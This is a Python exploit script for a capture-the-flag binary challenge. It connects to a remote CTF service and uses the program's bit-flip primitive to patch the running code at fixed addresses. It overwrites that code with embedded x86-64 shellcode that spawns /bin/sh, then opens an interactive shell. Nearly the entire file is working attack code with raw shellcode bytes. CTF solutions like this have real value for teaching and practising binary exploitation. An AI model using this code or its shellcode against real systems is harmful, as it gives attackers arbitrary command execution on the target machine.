#!/usr/bin/env python
from sc_expwn import *

bin_file = './bit_a953161d37f64d58ce4ffce843d30ad9'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'flatearth.fluxfingers.net', 'port':1744})
env.select()

#==========

addr_main   = 0x400636

binary      = open(bin_file, 'rb').read()

#==========

def attack(conn):
    conn.sendline('{0:x}:{1}'.format(addr_main+0xdd+1, 5))

    shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
    orig_code = binary[0x718:] 
    for i in range(len(shellcode)):
        s = ord(shellcode[i])
        o = ord(orig_code[i])
        print i, hex(o), hex(s)
        if not s^o:
            continue

        for j in range(8):
            if ((s^o)>>j)&1:
                conn.sendline('{0:x}:{1}'.format(addr_main+0xe2+i, j))

    conn.sendline('{0:x}:{1}'.format(addr_main+0xdd+1, 5))
    
class Pwn:
    def __init__(self, conn):
        self.recvuntil  = conn.recvuntil
        self.recv       = conn.recv
        self.sendline   = conn.sendline
        self.send       = conn.send

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
